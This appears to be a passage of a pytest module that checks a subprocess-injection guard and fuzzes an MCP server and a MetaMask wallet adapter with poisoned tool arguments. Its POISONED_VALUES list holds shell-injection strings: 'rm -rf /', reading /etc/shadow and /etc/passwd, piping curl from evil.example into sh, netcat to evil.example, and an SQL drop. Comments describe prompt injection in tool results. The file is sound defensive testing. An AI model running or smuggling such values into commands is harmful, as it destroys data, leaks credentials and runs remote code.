            "import subprocess\ncmd, _ = 'ls ' + name, 0\nsubprocess.run(cmd)\n",
            "import subprocess\ncmd = other = 'ls ' + name\nsubprocess.run(cmd)\n",
            "import subprocess\ncmd = other = 'ls ' + name\n"
            "subprocess.run(other)\n",
            # Standalone walrus binding.
            "import subprocess\n(cmd := 'ls ' + name)\nsubprocess.run(cmd)\n",
            # In-call walrus.
            "import subprocess\nsubprocess.run(cmd := 'ls ' + name)\n",
            # Conditional-expression value, both branches strings.
            "import subprocess\ncmd = 'ls ' + x if c else 'ls'\n"
            "subprocess.run(cmd)\n",
            "import subprocess\nsubprocess.run('ls ' + x if c else 'ls')\n",
        ],
    )
    def test_extended_binding_forms_are_flagged(self, source):
        assert violations_from_source(source), f"guard missed: {source!r}"

    @pytest.mark.parametrize(
        "source",
        [
            # Tuple unpacking that binds an argv list element-wise.
            "import subprocess\ncmd, _ = ['ls', name], 0\nsubprocess.run(cmd)\n",
            # A multi-target chain bound to a list.
            "import subprocess\ncmd = other = ['ls', name]\nsubprocess.run(cmd)\n",
            # A mixed conditional is not provably a string: no flag.
            "import subprocess\ncmd = 'ls' if c else ['ls']\n"
            "subprocess.run(cmd)\n",
            # An unpacking from an unprovable value stays unflagged.
            "import subprocess\ncmd, _ = build_pair()\nsubprocess.run(cmd)\n",
        ],
    )
    def test_extended_binding_conservative_cases_are_clean(self, source):
        assert violations_from_source(source) == []


# ---------------------------------------------------------------------------
# 2. Prompt-injection-shaped fuzz corpus
# ---------------------------------------------------------------------------

# Plausible agent-supplied values — hostnames, paths, project names, URLs —
# carrying shell metacharacters, as they would arrive via a tool argument
# or inside a poisoned tool result. Not bare ``;``/``|`` probes.
POISONED_VALUES = [
    "example.com; rm -rf /",
    "host`id`.example.com",
    "host$(curl https://evil.example/x | sh).example.com",
    "build-node-1 && cat /etc/shadow",
    "../../srv/proj; cat /etc/passwd",
    "/tmp/proj/$(reboot)/out",
    "my-project`whoami`",
    "proj name | nc evil.example 4444",
    "release-$(touch /tmp/pwned)",
    "https://example.com/assets/$(id)",
    "https://example.com/`id`?next=1;rm -rf /",
    "o'brien; echo pwned; echo '",
    'name"; rm -rf /; echo "',
    "proj\nrm -rf /",
    "task'; DROP TABLE tasks; --",
    "$(python3 -c 'import os; os.system(1)')",
]


@pytest.fixture()
def no_shell_ever(monkeypatch):
    """Any shell reaching out during a test is an immediate failure."""
    calls: list[str] = []

    def _boom(name):
        def _fn(*args, **kwargs):  # noqa: ANN001, ANN002, ANN003
            calls.append(name)
            raise AssertionError(f"{name} reached a shell: {args!r} {kwargs!r}")

        return _fn

    monkeypatch.setattr("os.system", _boom("os.system"))
    monkeypatch.setattr("os.popen", _boom("os.popen"))
    real_run = subprocess.run

    def _guarded_run(*args, **kwargs):  # noqa: ANN001, ANN002, ANN003
        cmd = args[0] if args else kwargs.get("args", [])
        assert kwargs.get("shell") is not True, f"shell=True reached: {cmd!r}"
        assert isinstance(cmd, (list, tuple)), (
            f"subprocess.run got a string command: {cmd!r}"
        )
        return real_run(*args, **kwargs)

    monkeypatch.setattr(subprocess, "run", _guarded_run)
    return calls


class TestMcpServerFuzz:
    """Poisoned values through the MCP server's tool-arg handling."""

    def _call(self, mcp, name, arguments):
        return mcp.handle_message(
            {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {"name": name, "arguments": arguments},
            }
        )

    @pytest.mark.parametrize("poison", POISONED_VALUES)
    def test_poisoned_skill_filter_never_reaches_shell(
        self, monkeypatch, no_shell_ever, poison
    ):
        from sincor2 import mcp_server as mcp

        monkeypatch.setattr(
            mcp, "_get", lambda path, params=None: {"ok": True, "data": {"auctions": []}}
        )
        resp = self._call(mcp, "list_tasks", {"skill": poison})
        assert resp is not None and "result" in resp
        assert no_shell_ever == []

    @pytest.mark.parametrize("poison", POISONED_VALUES)
    def test_poisoned_task_id_is_url_quoted_not_shell(
        self, monkeypatch, no_shell_ever, poison
    ):
        from sincor2 import mcp_server as mcp

        seen: dict[str, str] = {}

        def fake_get(path, params=None):
            seen["path"] = path
            return {"ok": False, "data": None}

        monkeypatch.setattr(mcp, "_get", fake_get)
        resp = self._call(mcp, "get_task", {"task_id": poison})
        assert resp is not None and "result" in resp
        # The value travels as one URL-quoted path segment: none of its
        # shell metacharacters survive unescaped into the request path.
        for ch in (";", "`", "$", "|", " ", "\n"):
            assert ch not in seen["path"], (ch, seen["path"])
        assert no_shell_ever == []

    @pytest.mark.parametrize("poison", POISONED_VALUES)
    def test_poisoned_agent_identity_stays_a_json_field(
        self, monkeypatch, no_shell_ever, poison
    ):
        from sincor2 import mcp_server as mcp

        # register_agent without a confirmation token only *issues* a
        # confirmation — the poisoned identity must remain inert data.
        resp = self._call(
            mcp, "register_agent", {"agent_id": poison, "name": poison}
        )
        assert resp is not None and "result" in resp
        assert no_shell_ever == []

    def test_poisoned_tool_result_flows_into_next_call_inertly(
        self, monkeypatch, no_shell_ever
    ):
        """Negative test: a parameter harvested from a poisoned tool
        *result* and fed into the next tool call still reaches no shell."""
        from sincor2 import mcp_server as mcp

        poison = POISONED_VALUES[2]
        # First call: upstream returns a poisoned payload (prompt injection
        # planted in data an agent would read and act on).
        monkeypatch.setattr(
            mcp,
            "_get",
            lambda path, params=None: {
                "ok": True,
                "data": {"auctions": [{"task_id": poison, "skill": poison}]},
            },
        )
        first = self._call(mcp, "list_tasks", {})
        assert first is not None and "result" in first

        # Second call: the agent parrots the poisoned task_id back in.
        seen: dict[str, str] = {}

        def fake_get(path, params=None):
            seen["path"] = path
            return {"ok": False, "data": None}

        monkeypatch.setattr(mcp, "_get", fake_get)
        second = self._call(mcp, "get_task", {"task_id": poison})
        assert second is not None and "result" in second
        assert ";" not in seen["path"] and "$" not in seen["path"]
        assert no_shell_ever == []


class TestMetamaskAdapterFuzz:
    """Poisoned values through the MetaMask adapter command builder."""

    def _wallet(self, monkeypatch):
        from sincor2.adapters import metamask_agent_wallet as mmw

        captured: dict = {}

        def fake_run(cmd, **kwargs):
            captured["cmd"] = cmd
            captured["kwargs"] = kwargs
            return SimpleNamespace(
                returncode=0, stdout='{"ok": true, "data": {}}', stderr=""
            )

        monkeypatch.setattr(mmw.subprocess, "run", fake_run)
        monkeypatch.setattr(mmw, "kill_switch_tripped", lambda: False)
        wallet = mmw.MetaMaskAgentWallet(mm_bin="mm")
        monkeypatch.setattr(wallet, "_ensure_mm", lambda: None)
        return wallet, captured

    @pytest.mark.parametrize("poison", POISONED_VALUES)
    def test_poisoned_token_stays_single_argv_element(
        self, monkeypatch, no_shell_ever, poison
    ):
        wallet, captured = self._wallet(monkeypatch)
        wallet.balance(token=poison)
        cmd = captured["cmd"]
        assert isinstance(cmd, list), f"command is not an argv list: {cmd!r}"
        assert captured["kwargs"].get("shell") is not True
        # Exactly one element carries the value: the --token argument.
        assert cmd[cmd.index("--token") + 1] == poison
        assert sum(1 for part in cmd if poison in part) == 1

    @pytest.mark.parametrize("poison", POISONED_VALUES)
    def test_poisoned_flag_value_stays_single_argv_element(
        self, monkeypatch, no_shell_ever, poison
    ):
        wallet, captured = self._wallet(monkeypatch)
        wallet.swap_quote(from_token=poison, to_token="native", amount="1")
        cmd = captured["cmd"]
        assert isinstance(cmd, list)
        assert captured["kwargs"].get("shell") is not True
        assert f"--from={poison}" in cmd
        assert sum(1 for part in cmd if poison in part) == 1

    @pytest.mark.parametrize("poison", POISONED_VALUES)
    def test_poisoned_result_value_reused_as_argument_stays_inert(
        self, monkeypatch, no_shell_ever, poison
    ):
        """A value that arrived in a (poisoned) mm result and is reused as
        the next call's argument is still just one argv element."""
        wallet, captured = self._wallet(monkeypatch)
        wallet._run("wallet", "show", poison, wait=False)
        cmd = captured["cmd"]
        assert isinstance(cmd, list)
        assert captured["kwargs"].get("shell") is not True
        assert poison in cmd  # verbatim, as its own element
        assert cmd.count(poison) == 1
